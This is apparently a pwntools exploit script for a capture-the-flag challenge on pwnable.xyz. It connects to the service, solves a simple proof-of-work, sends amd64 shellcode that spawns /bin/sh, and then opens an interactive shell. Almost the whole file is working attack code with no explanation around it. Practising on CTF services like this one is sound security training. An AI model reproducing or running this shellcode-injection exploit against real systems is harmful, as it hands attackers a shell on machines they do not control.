from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30025

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

shellcode = asm("""
add BYTE PTR [rax], al
""") + asm(shellcraft.amd64.linux.sh())

def solve_pow(r):
    r.recvuntil(b"0x")
    sum = int(r.recvline(), 16)

    r.sendline(f"{sum} 0".encode())
    
def main():
    r  = conn()
    solve_pow(r)

    r.sendlineafter(b"Input: ", shellcode)
    r.interactive()

if __name__ == "__main__":
    main()
